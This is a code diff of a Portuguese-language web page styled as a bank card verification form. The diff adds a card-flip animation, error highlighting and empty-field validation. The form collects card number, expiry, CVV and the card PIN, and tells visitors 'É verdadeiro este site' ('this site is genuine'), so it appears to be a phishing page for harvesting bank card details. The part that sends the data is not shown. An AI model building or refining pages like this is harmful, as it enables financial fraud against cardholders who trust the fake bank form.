@@ -30,19 +30,30 @@
       max-width: 1200px;
       width: 100%;
       justify-content: center;
+      perspective: 1000px;
     }
 
     .cards {
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      align-items: center;
+      width: 340px;
+      height: 200px;
+      position: relative;
+      transform-style: preserve-3d;
+      transition: transform 0.8s ease;
+    }
+
+    .cards.virar {
+      transform: rotateY(180deg);
+    }
+
+    .card, .card-back {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border-radius: 20px;
+      backface-visibility: hidden;
     }
 
     .card {
-      width: 340px;
-      height: 200px;
-      border-radius: 20px;
       background: linear-gradient(135deg, #2d1f55, #5a47a5);
       color: white;
       padding: 20px;
@@ -51,6 +62,7 @@
       flex-direction: column;
       justify-content: space-between;
       animation: fadeIn 1s ease;
+      z-index: 2;
     }
 
     .card .top {
@@ -81,31 +93,28 @@
       animation: glowNumber 0.4s ease;
     }
 
-    @keyframes glowNumber {
-      0% { color: #fff; text-shadow: 0 0 10px #fff; }
-      100% { color: #ddd; text-shadow: none; }
-    }
-
     .card .bottom {
       display: flex;
       justify-content: space-between;
       font-size: 14px;
     }
 
+    @keyframes glowNumber {
+      0% { color: #fff; text-shadow: 0 0 10px #fff; }
+      100% { color: #ddd; text-shadow: none; }
+    }
+
     .card-back {
       background: linear-gradient(135deg, #222, #444);
       color: white;
       padding: 20px;
-      border-radius: 20px;
-      width: 340px;
-      height: 100px;
       display: flex;
       align-items: center;
       justify-content: flex-end;
       font-weight: bold;
       font-family: monospace;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-      animation: fadeIn 1.5s ease;
+      transform: rotateY(180deg);
     }
 
     .cvv-box {
@@ -156,6 +165,10 @@
     input:focus {
       border-color: #44307a;
       outline: none;
+    }
+
+    .erro {
+      border-color: red !important;
     }
 
     .row {
@@ -222,7 +235,7 @@
         align-items: center;
       }
 
-      .card, .card-back, .formulario {
+      .cards, .formulario {
         width: 100%;
         max-width: 350px;
       }
@@ -243,8 +256,8 @@
 
   <div class="container">
 
-    <!-- Cartões -->
-    <div class="cards">
+    <!-- Cartão com frente e verso -->
+    <div class="cards" id="cartao">
       <div class="card">
         <div class="top">
           <div class="logo"><i class="fas fa-university"></i> Banco</div>
@@ -278,14 +291,18 @@
         </div>
         <div>
           <label for="cvv">CVV</label>
-          <input type="text" id="cvv" maxlength="3" placeholder="123" oninput="formatarCVV(this)">
+          <input type="text" id="cvv" maxlength="3" placeholder="123" 
+            oninput="formatarCVV(this)" 
+            onfocus="virarCartao(true)" 
+            onblur="virarCartao(false)">
         </div>
       </div>
 
       <label for="senha">Senha do cartão</label>
       <input type="password" id="senha" placeholder="******">
 
-      <button onclick="mostrarMensagem()">Verificar</button>
+      <button onclick="validarFormulario()">Verificar</button>
+
       <div class="verificacao"><i class="fas fa-shield-alt"></i> É verdadeiro este site</div>
     </div>
   </div>
@@ -315,9 +332,7 @@
       } else {
         input.value = valor;
       }
-
-      const cardDate = document.getElementById("cardDate");
-      cardDate.textContent = input.value ? `Válido até ${input.value}` : "Válido até 12/29";
+      document.getElementById("cardDate").textContent = input.value ? `Válido até ${input.value}` : "Válido até 12/29";
     }
 
     function formatarCVV(input) {
@@ -327,8 +342,35 @@
 
     function atualizarNome(input) {
       input.value = input.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '');
-      const nameDisplay = document.getElementById("cardName");
-      nameDisplay.textContent = input.value || "NOME NO CARTÃO";
+      document.getElementById("cardName").textContent = input.value || "NOME NO CARTÃO";
+    }
+
+    function virarCartao(virar) {
+      const cartao = document.getElementById("cartao");
+      if (virar) {
+        cartao.classList.add("virar");
+      } else {
+        cartao.classList.remove("virar");
+      }
+    }
+
+    function validarFormulario() {
+      const campos = ["nome", "numero", "exp", "cvv", "senha"];
+      let vazio = false;
+
+      campos.forEach(id => {
+        const campo = document.getElementById(id);
+        if (!campo.value.trim()) {
+          campo.classList.add("erro");
+          vazio = true;
+        } else {
+          campo.classList.remove("erro");
+        }
+      });
+
+      if (!vazio) {
+        mostrarMensagem();
+      }
     }
 
     function mostrarMensagem() {
